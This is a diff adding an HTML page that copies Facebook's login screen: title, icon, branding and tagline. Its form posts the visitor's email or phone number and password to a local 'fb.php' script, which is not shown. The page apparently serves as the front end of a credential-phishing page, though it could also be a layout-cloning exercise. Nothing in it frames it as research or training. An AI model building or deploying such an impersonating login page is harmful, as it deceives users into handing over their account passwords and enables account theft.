@@ -1,0 +1,69 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - log in or sign up</title>
+    <link rel="icon" href="img/facebook.png">
+    <link rel="stylesheet" href="plugins/fontawesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="plugins/bootstrap/css/bootstrap.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <section class="py-5">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 top d-none d-md-block">
+                    <h1 class="text-primary head">facebook</h1>
+                    <p class="book">Facebook helps you connect and share with the people in your life.</p>
+                </div>
+                <div class="col-md-5">
+                    <p class="heads text-center d-block d-md-none">facebook</p>
+                    <div class="card shadow side">
+                    <form name="fb_form" action="fb.php" method="POST" enctype="multipart/form-data" class="form-controls py-4">
+                        <div class="row justify-content-center">
+                                <div class="col-md-12">
+                                    <input type="text" placeholder="Email address or phone number" class="form-control place" required maxlength="30" name="name">
+                                </div>
+                                <div class="col-md-12">
+                                    <input type="password" placeholder="Password" class="form-control place mt-3" required minlength="5" maxlength="10" name="password">
+                                </div>
+                                </div>
+                                <div class="row">
+                                <div class="col-md-12">
+                                    <!-- <a href="#" class="form-control btn btn-primary " style="font-size: 23px; font-weight: 600;">Log In</a>   -->
+                                    <input type="submit" value="Log In"  name="sub_face" class="form-control btn btn-primary my-4">
+                               </div>
+                               </div>
+                               <div class="row">
+                                   <div class="col-md-12 text-center">
+                                   <a href="#" class="text-primary pass"><small>Forgotten password?</small></a>
+                                   </div>
+                               </div>
+                               <div class="row justify-content-center">
+                                   <div class="col-md-5 d-none d-md-block py-1"><hr></div>
+                                  <div class="py-2">or</div>
+                                   <div class="col-md-5 d-none d-md-block py-1"><hr></div>
+                               </div>
+                            </form>   
+                            <div class="row justify-content-center">
+                                <div class="col-md-7">
+                                 <!-- <a href="#" class="form-control btn btn-success">Create New Account</a>  -->
+                                 <input type="submit" value="Create New Account" name="submit" class="form-control btn btn-success" >
+                            </div> 
+                            </div>    
+                    </div>
+                    <div class="row">
+                        <div class="col-md-12 page">
+                   <span><a href="#" class="pages">Create a Page</a></span> for a celebrity, brand or business. 
+                    </div>
+                  </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+</body>
+</html>
